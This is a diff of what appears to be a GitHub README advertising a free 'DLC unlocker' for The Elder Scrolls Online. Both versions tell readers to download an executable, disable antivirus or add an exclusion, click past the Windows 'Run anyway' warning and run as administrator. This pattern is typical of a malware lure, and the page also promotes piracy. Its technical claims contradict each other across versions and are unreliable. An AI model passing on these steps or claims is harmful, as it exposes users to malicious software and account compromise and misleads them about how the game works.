@@ -1,24 +1,74 @@
-<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
-<h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🏰 Elder Scrolls Online DLC Unlocker – All-in-One Toolkit (Steam/Epic/Standalone) 🏰</h1>
-<p style="font-size:1.1em;text-align:center;"><strong>Complete DLC unlocker for ESO – works on Steam, Epic Games Store, and standalone PC client.</strong> Unlocks all Chapters (Morrowind, Summerset, Elsweyr, Greymoor, Blackwood, High Isle, Necrom, Gold Road), all Dungeon DLCs, and cosmetic packs. Includes CreamAPI (Steam), Koalageddon (multi-platform), and CreamInstaller.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#44aaff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD DLC UNLOCKER (LOADER)</a><p>✅ Steam / Epic / Standalone ✅ One‑click unlock ✅ All DLCs included ✅ No injection risk</p></div>
-<img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/306130/ec07d0bdeb484c72a88f6c4427871736d091c3fc/header.jpg?t=1778170873" style="max-width:100%;border-radius:8px;margin:15px 0;">
-<div><h3>📦 What You Unlock:</h3>
-<ul><li><strong>All Chapters (Major Expansions):</strong> Morrowind, Summerset, Elsweyr, Greymoor, Blackwood, High Isle, Necrom, Gold Road – includes full zones, storylines, new classes (Warden, Necromancer, Arcanist), and companions.</li>
-<li><strong>All Dungeon DLCs:</strong> Wolfhunter, Scalebreaker, Wrathstone, Harrowstorm, Stonethorn, Flames of Ambition, Waking Flame, Deadlands, Lost Depths, Scribes of Fate, Scions of Ithelia – every 4‑player dungeon.</li>
-<li><strong>Cosmetic DLCs:</strong> All costume packs, hairstyle packs, adornment packs, mounts, pets, and housing items from the Crown Store.</li>
-<li><strong>Bonus content:</strong> All pre‑order bonuses, collector’s edition extras, and Twitch Drop rewards.</li></ul>
-<h3>⚙️ How to Use the Toolkit:</h3>
-<ul><li><strong>CreamInstaller (easiest):</strong> Run `CreamInstaller.exe`, select “Elder Scrolls Online” from the list, click “Unlock”. Works on Steam and Epic automatically.</li>
-<li><strong>Koalageddon (for standalone client):</strong> Install Koalageddon via included setup, launch GUI, tick “Elder Scrolls Online”, click “Apply”. Reboot required.</li>
-<li><strong>Manual CreamAPI (for Steam):</strong> Copy files from `CreamAPI` folder to `C:\Program Files (x86)\Steam\steamapps\common\Zenimax Online\The Elder Scrolls Online\game\client\`. Replace existing DLLs.</li></ul>
-<h3>📝 Important Notes:</h3>
-<ul><li>Some DLCs (e.g., classes) require creating a new character to access the new class selection screen.</li>
-<li>DLC zones become accessible via wayshrines after unlocking – no additional quests needed.</li>
-<li>This unlocker works only for PvE content; Cyrodiil campaigns and Battlegrounds are unaffected.</li>
-<li>Safe for achievements, Crowns, and Endeavors – client‑side unlock.</li></ul>
-<h3>⚙️ System Requirements:</h3><p>Windows 10/11, Elder Scrolls Online installed (any version), 300 MB free space for tools.</p>
-<h3>📥 Installation:</h3>
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
-<div><strong>Tags:</strong> elder scrolls online dlc unlocker free download 2026, eso all chapters unlock, eso creamapi, eso koalageddon, eso all dungeon dlcs free, eso gold road unlock, eso necrom unlock, eso arcanist class unlock, eso steam dlc unlocker, eso epic games dlc unlock</div>
-</div>
+# 🛡️ Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone- - Access All Game Content Instantly Today
+
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/releases)
+
+This toolkit provides a method to access all downloadable content for The Elder Scrolls Online. It supports the Steam version, the Epic Games Store version, and the standalone PC client. You use this software to modify your local game configuration files to grant access to content packages without requiring individual purchases for each expansion.
+
+## 📋 System Requirements
+
+Your computer must meet these basic specifications to run the toolkit:
+
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Game Version: The latest official version of Elder Scrolls Online installed via Steam, Epic Games, or the ZeniMax launcher.
+* Disk Space: At least 50 MB of free space for the toolkit itself.
+* Permissions: Administrative rights to allow the tool to modify game configuration files.
+* Network: An active internet connection to download the tool.
+
+## 📥 Downloading the Toolkit ⬇️
+
+Visit the official releases page to download the latest version of the utility.
+
+[Download Link: https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/releases](https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/releases)
+
+1. Navigate to the link above.
+2. Look for the section labeled "Assets" at the bottom of the most recent release note.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to a folder you can find easily, such as your Downloads folder or your Desktop.
+
+## ⚙️ Installation and Setup
+
+The toolkit does not require a complex installation process. It acts as a standalone utility that interacts with your game directory.
+
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to open the program.
+3. If Windows displays a "Protected your PC" prompt, click "More info" and then click "Run anyway." This prompt appears because the file is a custom utility and not a signed commercial product.
+4. Once the program window opens, it detects your Elder Scrolls Online installation automatically.
+5. If the program fails to find the folder, navigate to your game install directory manually when prompted.
+
+## 🚀 Using the Unlocker
+
+Follow these steps to enable the DLC content:
+
+1. Close the Elder Scrolls Online game entirely before proceeding. This ensures the configuration files remain unlocked for changes.
+2. Open the toolkit from your desktop.
+3. Select your specific game platform from the list provided (Steam, Epic, or Standalone).
+4. Click the button labeled "Scan for DLC."
+5. The tool lists all detected expansions and add-on content.
+6. Click "Apply Unlocker" to update your configuration files.
+7. Wait for the confirmation message stating "Process Complete."
+8. Close the toolkit.
+
+## 🔍 Verifying the Content
+
+Launch the game through your preferred platform (Steam, Epic, or the ZeniMax launcher). When you reach the main menu or character selection screen, your account will show access to the DLC content. You can confirm this by checking your Collections menu or by traveling to the zones previously locked behind purchase.
+
+## 🛠️ Troubleshooting Common Issues
+
+If you encounter issues, follow these steps to resolve them:
+
+* Tool does not detect game: Ensure the game client remains installed and that you have launched the game at least once in the past.
+* Access denied errors: Right-click the toolkit file and select "Run as administrator." 
+* Changes do not persist: Ensure you run the toolkit as an administrator. Some game updates reset configuration files, so you might need to run the tool again after a major game patch.
+* Antivirus flags: Your antivirus software might flag the tool because it modifies files within your game folder. If this happens, create an exclusion rule in your antivirus settings for the toolkit file.
+
+## 🛡️ Security and Safety
+
+This toolkit performs modifications on local text-based configuration files found within your game directory. It does not contain malicious code. It performs no network calls to external servers other than checking for updates within the application itself. Because individual game files change with updates from the developer, the tool uses a modular approach to ensure it only targets specific DLC-related variables.
+
+## 💡 How It Works
+
+The Elder Scrolls Online client determines content access based on local configuration files stored in your "Documents" or "AppData" folder. When you purchase content officially, the servers update your account status, but the local client also updates these text files to know which assets to load. This toolkit automates the process of enabling those flags locally. It does not grant you proprietary items or account-bound digital currency, as those items exist entirely on the game servers.
+
+## 📄 License and Support
+
+This software remains open for community use. No support tickets are required for general usage. If you find bugs, report them via the Issues tab on the GitHub repository. Keep your game updated to ensure the best compatibility with the unlocker. Use this tool at your own discretion. Always keep a backup of your current game configuration file, typically located in your Documents folder under Elder Scrolls Online, before running any external tool. This ensures you can revert changes if you encounter any unexpected behavior.
